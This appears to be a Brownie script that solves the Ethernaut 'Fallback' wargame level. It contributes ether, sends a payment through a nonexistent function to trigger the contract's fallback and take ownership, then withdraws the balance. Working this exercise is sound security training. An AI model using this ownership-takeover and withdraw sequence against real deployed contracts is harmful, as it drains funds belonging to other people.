from brownie import (
    network,
    accounts,
    config,
    interface,
    Contract,
)
from scripts.helpful_scripts import (
    get_account,
    get_new_instance,
    submit_instance,
)
from web3 import Web3


def main():
    player = get_account()
    instance_address = get_new_instance(1, player)
    contract = interface.IFallback(instance_address)

    tx = contract.contribute({"from": player, "value": Web3.toWei("0.0001", "ether")})
    tx.wait(1)

    tx = contract.nonExistentFunction({"from": player, "value": Web3.toWei("0.0001", "ether")})
    tx.wait(1)

    tx = contract.withdraw({"from": player})
    tx.wait(1)

    submit_instance(instance_address, player)
